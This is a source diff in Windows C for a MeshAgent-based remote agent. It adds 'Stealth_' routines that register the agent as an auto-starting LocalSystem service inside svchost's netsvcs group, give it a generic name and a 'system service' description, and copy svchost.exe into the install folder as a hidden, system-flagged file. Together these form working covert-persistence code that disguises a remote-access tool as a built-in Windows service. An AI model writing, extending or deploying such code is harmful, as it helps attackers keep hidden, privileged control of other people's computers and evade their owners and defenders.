@@ -31,6 +31,9 @@ static SERVICE_STATUS g_SvchostStatus = {0};
 static BOOL g_SvchostRunning = FALSE;
 static MeshAgentHostContainer* g_SvchostAgent = NULL;
 
+// Forward declarations
+static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand);
+
 /**
  * Service control handler for svchost-hosted mode
  */
@@ -179,14 +182,100 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
     HKEY hKey = NULL;
     HKEY hParamsKey = NULL;
     HKEY hSvchostKey = NULL;
+    SC_HANDLE hSCM = NULL;
+    SC_HANDLE hService = NULL;
     LONG result;
     BOOL success = FALSE;
+    BOOL netsvcsConfigured = FALSE;
     wchar_t keyPath[512];
     DWORD dwType, dwSize;
+    WCHAR wDisplayName[256] = {0};
+    WCHAR wDescription[512] = {0};
+    const wchar_t* groupName = L"netsvcs";
+    WCHAR hostExePath[MAX_PATH] = {0};
+    BOOL hostExeUsesExpand = FALSE;
+    WCHAR imagePathValue[512] = {0};
 
-    if (!serviceName || !dllPath)
+    if (serviceName == NULL || serviceName[0] == 0 || dllPath == NULL || dllPath[0] == 0)
     {
         return FALSE;
+    }
+
+    if (!Stealth_SelectSvchostImage(dllPath, hostExePath, _countof(hostExePath), &hostExeUsesExpand))
+    {
+        // even if selection fails, hostExePath contains fallback
+    }
+
+    if (hostExePath[0] == 0)
+    {
+        lstrcpynW(hostExePath, L"%SystemRoot%\\System32\\svchost.exe", (int)_countof(hostExePath));
+        hostExeUsesExpand = TRUE;
+    }
+
+    _snwprintf_s(imagePathValue, _countof(imagePathValue), _TRUNCATE, L"%s -k %s -p", hostExePath, groupName);
+
+    if (MESH_AGENT_SERVICE_NAME != NULL)
+    {
+#ifdef UNICODE
+        lstrcpynW(wDisplayName, MESH_AGENT_SERVICE_NAME, (int)_countof(wDisplayName));
+#else
+        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_NAME, -1, wDisplayName, (int)_countof(wDisplayName));
+#endif
+    }
+    if (MESH_AGENT_FILE_DESCRIPTION != NULL)
+    {
+        MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_FILE_DESCRIPTION, -1, wDescription, (int)_countof(wDescription));
+    }
+    if (wDescription[0] == 0)
+    {
+        lstrcpynW(wDescription, L"system service", (int)_countof(wDescription));
+    }
+
+    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
+    if (hSCM != NULL)
+    {
+        hService = CreateServiceW(
+            hSCM,
+            serviceName,
+            (wDisplayName[0] != 0) ? wDisplayName : serviceName,
+            SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE,
+            SERVICE_WIN32_SHARE_PROCESS,
+            SERVICE_AUTO_START,
+            SERVICE_ERROR_NORMAL,
+            imagePathValue,
+            NULL,
+            NULL,
+            NULL,
+            L"LocalSystem",
+            NULL);
+
+        if (hService == NULL)
+        {
+            if (GetLastError() == ERROR_SERVICE_EXISTS)
+            {
+                hService = OpenServiceW(hSCM, serviceName, SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_CHANGE_CONFIG | DELETE);
+                if (hService != NULL)
+                {
+                    ChangeServiceConfigW(
+                        hService,
+                        SERVICE_WIN32_SHARE_PROCESS,
+                        SERVICE_AUTO_START,
+                        SERVICE_ERROR_NORMAL,
+                        imagePathValue,
+                        NULL,
+                        NULL,
+                        NULL,
+                        NULL,
+                        L"LocalSystem",
+                        (wDisplayName[0] != 0) ? wDisplayName : NULL);
+                }
+            }
+        }
+    }
+
+    if (hService == NULL)
+    {
+        goto CLEANUP;
     }
 
     // Create service registry key
@@ -197,7 +286,7 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
                              KEY_WRITE, NULL, &hKey, NULL);
     if (result != ERROR_SUCCESS)
     {
-        return FALSE;
+        goto CLEANUP;
     }
 
     // Set service type to SHARE_PROCESS
@@ -213,19 +302,22 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
     RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (LPBYTE)&dwErrorControl, sizeof(DWORD));
 
     // Set ImagePath to svchost with netsvcs group
-    const wchar_t* groupName = L"netsvcs";
-    wchar_t imagePath[256];
-    _snwprintf_s(imagePath, _countof(imagePath), _TRUNCATE, L"%%SystemRoot%%\\System32\\svchost.exe -k %s -p", groupName);
-    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
-                   (LPBYTE)imagePath, (DWORD)((wcslen(imagePath) + 1) * sizeof(wchar_t)));
+    RegSetValueExW(hKey, L"ImagePath", 0, hostExeUsesExpand ? REG_EXPAND_SZ : REG_SZ,
+                   (LPBYTE)imagePathValue, (DWORD)((wcslen(imagePathValue) + 1) * sizeof(wchar_t)));
 
     // Set display name (generic)
-    RegSetValueEx(hKey, TEXT("DisplayName"), 0, REG_SZ,
-                  (LPBYTE)MESH_AGENT_SERVICE_NAME, (DWORD)((lstrlen(MESH_AGENT_SERVICE_NAME) + 1) * sizeof(TCHAR)));
+    if (wDisplayName[0] != 0)
+    {
+        RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ,
+                       (LPBYTE)wDisplayName, (DWORD)((wcslen(wDisplayName) + 1) * sizeof(wchar_t)));
+    }
 
     // Set description (generic)
-    RegSetValueEx(hKey, TEXT("Description"), 0, REG_SZ,
-                  (LPBYTE)TEXT(MESH_AGENT_FILE_DESCRIPTION), (DWORD)((lstrlen(TEXT(MESH_AGENT_FILE_DESCRIPTION)) + 1) * sizeof(TCHAR)));
+    if (wDescription[0] != 0)
+    {
+        RegSetValueExW(hKey, L"Description", 0, REG_SZ,
+                       (LPBYTE)wDescription, (DWORD)((wcslen(wDescription) + 1) * sizeof(wchar_t)));
+    }
 
     // Set ObjectName (LocalSystem)
     const wchar_t* objectName = L"LocalSystem";
@@ -252,9 +344,14 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
         RegSetValueExW(hParamsKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, (LPBYTE)&unload, sizeof(unload));
 
         RegCloseKey(hParamsKey);
+        hParamsKey = NULL;
     }
 
-    RegCloseKey(hKey);
+    if (hKey != NULL)
+    {
+        RegCloseKey(hKey);
+        hKey = NULL;
+    }
 
     // Add service to svchost netsvcs group
     result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
@@ -262,7 +359,6 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
                            0, KEY_READ | KEY_WRITE, &hSvchostKey);
     if (result == ERROR_SUCCESS)
     {
-        // Read current netsvcs value
         WCHAR currentServices[4096] = {0};
         dwSize = sizeof(currentServices);
         dwType = REG_MULTI_SZ;
@@ -270,50 +366,80 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
         result = RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &dwType,
                                   (LPBYTE)currentServices, &dwSize);
 
-        if (result == ERROR_SUCCESS || result == ERROR_MORE_DATA)
+        if (result == ERROR_FILE_NOT_FOUND)
         {
-            // Check if our service is already in the list
-            BOOL found = FALSE;
+            currentServices[0] = L'\0';
+            currentServices[1] = L'\0';
+            dwSize = sizeof(wchar_t);
+            result = ERROR_SUCCESS;
+        }
+
+        if (result == ERROR_SUCCESS)
+        {
             WCHAR* ptr = currentServices;
-            while (*ptr)
+            BOOL alreadyPresent = FALSE;
+
+            while (*ptr != L'\0')
             {
                 if (_wcsicmp(ptr, serviceName) == 0)
                 {
-                    found = TRUE;
+                    alreadyPresent = TRUE;
                     break;
                 }
                 ptr += wcslen(ptr) + 1;
             }
 
-            // Add our service to the list if not already present
-            if (!found)
+            if (!alreadyPresent)
             {
-                size_t currentLen = 0;
-                ptr = currentServices;
-                while (*ptr)
+                size_t usedChars = (size_t)(ptr - currentServices);
+                size_t nameLen = wcslen(serviceName) + 1; // include null terminator
+                size_t required = usedChars + nameLen + 1; // extra null for double-terminator
+
+                if (required >= _countof(currentServices))
                 {
-                    ptr += wcslen(ptr) + 1;
+                    goto CLEANUP;
                 }
-                currentLen = ptr - currentServices;
 
-                // Append our service name
-                wcscpy_s(currentServices + currentLen,
-                        (sizeof(currentServices)/sizeof(wchar_t)) - currentLen,
-                        serviceName);
-                currentLen += wcslen(serviceName) + 1;
-                currentServices[currentLen] = L'\0';  // Double null terminator
+                wcscpy_s(currentServices + usedChars, _countof(currentServices) - usedChars, serviceName);
+                usedChars += nameLen;
+                currentServices[usedChars] = L'\0';
+                usedChars++;
 
-                // Write back to registry
-                RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
-                              (LPBYTE)currentServices,
-                              (DWORD)((currentLen + 1) * sizeof(wchar_t)));
+                DWORD bytesToWrite = (DWORD)(usedChars * sizeof(wchar_t));
+                if (RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
+                                   (LPBYTE)currentServices, bytesToWrite) != ERROR_SUCCESS)
+                {
+                    goto CLEANUP;
+                }
             }
 
-            success = TRUE;
+            netsvcsConfigured = TRUE;
         }
 
         RegCloseKey(hSvchostKey);
+        hSvchostKey = NULL;
     }
+
+    if (!netsvcsConfigured)
+    {
+        goto CLEANUP;
+    }
+
+    if (hService != NULL && wDescription[0] != 0)
+    {
+        SERVICE_DESCRIPTIONW sd = {0};
+        sd.lpDescription = wDescription;
+        ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
+    }
+
+    success = TRUE;
+
+CLEANUP:
+    if (hSvchostKey != NULL) { RegCloseKey(hSvchostKey); }
+    if (hParamsKey != NULL) { RegCloseKey(hParamsKey); }
+    if (hKey != NULL) { RegCloseKey(hKey); }
+    if (hService != NULL) { CloseServiceHandle(hService); }
+    if (hSCM != NULL) { CloseServiceHandle(hSCM); }
 
     return success;
 }
@@ -410,3 +536,75 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
     return TRUE;
 }
 #endif // BUILD_SVCHOST_DLL
+static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathOut, size_t exePathOutLen, BOOL *useExpand)
+{
+    WCHAR windowsDir[MAX_PATH] = {0};
+    WCHAR installDir[MAX_PATH] = {0};
+
+    if (exePathOut == NULL || exePathOutLen == 0) { return FALSE; }
+    exePathOut[0] = L'\0';
+    if (useExpand != NULL) { *useExpand = FALSE; }
+
+    if (dllPath != NULL && dllPath[0] != 0)
+    {
+        lstrcpynW(installDir, dllPath, (int)_countof(installDir));
+        wchar_t *lastSlash = wcsrchr(installDir, L'\\');
+        if (lastSlash != NULL) { *lastSlash = L'\0'; }
+    }
+
+    if (GetWindowsDirectoryW(windowsDir, (DWORD)_countof(windowsDir)) > 0)
+    {
+        WCHAR pattern[MAX_PATH] = {0};
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = INVALID_HANDLE_VALUE;
+
+        _snwprintf_s(pattern, _countof(pattern), _TRUNCATE, L"%s\\WinSxS\\amd64_microsoft-windows-services-svchost_*", windowsDir);
+        hFind = FindFirstFileW(pattern, &findData);
+        if (hFind != INVALID_HANDLE_VALUE)
+        {
+            do
+            {
+                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
+                {
+                    WCHAR candidate[MAX_PATH] = {0};
+                    WCHAR target[MAX_PATH] = {0};
+
+                    _snwprintf_s(candidate, _countof(candidate), _TRUNCATE, L"%s\\WinSxS\\%s\\svchost.exe", windowsDir, findData.cFileName);
+                    if (GetFileAttributesW(candidate) == INVALID_FILE_ATTRIBUTES) { continue; }
+
+                    if (installDir[0] != 0)
+                    {
+                        _snwprintf_s(target, _countof(target), _TRUNCATE, L"%s\\svchost.exe", installDir);
+                        SetFileAttributesW(target, FILE_ATTRIBUTE_NORMAL);
+                        DeleteFileW(target);
+                        if (CopyFileW(candidate, target, FALSE))
+                        {
+                            SetFileAttributesW(target, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                            lstrcpynW(exePathOut, target, (int)exePathOutLen);
+                            FindClose(hFind);
+                            return TRUE;
+                        }
+                        else
+                        {
+                            DWORD err = GetLastError();
+                            fwprintf(stderr, L"[!] CopyFile failed: %s -> %s (error %lu)\n", candidate, target, err);
+                        }
+                    }
+                    else
+                    {
+                        lstrcpynW(exePathOut, candidate, (int)exePathOutLen);
+                        FindClose(hFind);
+                        return TRUE;
+                    }
+                }
+            } while (FindNextFileW(hFind, &findData));
+            FindClose(hFind);
+        }
+    }
+
+    // Fallback to the standard System32 path (may fail if truly missing)
+    lstrcpynW(exePathOut, L"%SystemRoot%\\System32\\svchost.exe", (int)exePathOutLen);
+    fwprintf(stderr, L"[!] Stealth_SelectSvchostImage falling back to default host path\n");
+    if (useExpand != NULL) { *useExpand = TRUE; }
+    return FALSE;
+}
